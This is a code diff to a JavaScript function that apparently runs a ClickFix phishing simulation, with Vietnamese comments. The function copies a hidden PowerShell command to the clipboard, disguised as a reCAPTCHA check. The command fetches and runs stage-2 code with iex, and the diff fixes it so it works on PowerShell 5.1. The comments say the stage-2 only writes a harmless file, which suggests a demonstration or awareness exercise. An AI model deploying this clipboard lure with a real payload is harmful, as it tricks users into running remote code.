@@ -223,9 +223,10 @@ function wireClickFix(el, token, onVerified) {
         //   1) cradle ngắn dưới đây được copy vào clipboard (hiện đủ "I am not a robot" trong hộp Run)
         //   2) cradle tải stage-2 từ server (/api/clickfix/s) rồi iex hidden:
         //      stage-2 tạo C:\Temp\hehehe.txt ('Hehehehe') + GET /api/clickfix/verify
+        //      (-UseBasicParsing bắt buộc: PS 5.1 không có IE engine sẽ NullRef nếu thiếu)
         // Phần "# ✅ ..." phía sau là comment của PowerShell — giống kỹ thuật ClickFix thật.
         const payload =
-          `powershell -w hidden -nop -ep bypass -c "iex(iwr '${origin}/api/clickfix/s?t=${encodeURIComponent(token)}')" ` +
+          `powershell -w hidden -nop -ep bypass -c "iex(iwr '${origin}/api/clickfix/s?t=${encodeURIComponent(token)}' -UseBasicParsing)" ` +
           `# \u2705 ''I am not a robot - reCAPTCHA Verification ID: ${vid}''`;
         copyToClipboard(payload);
         modal.classList.add("open");
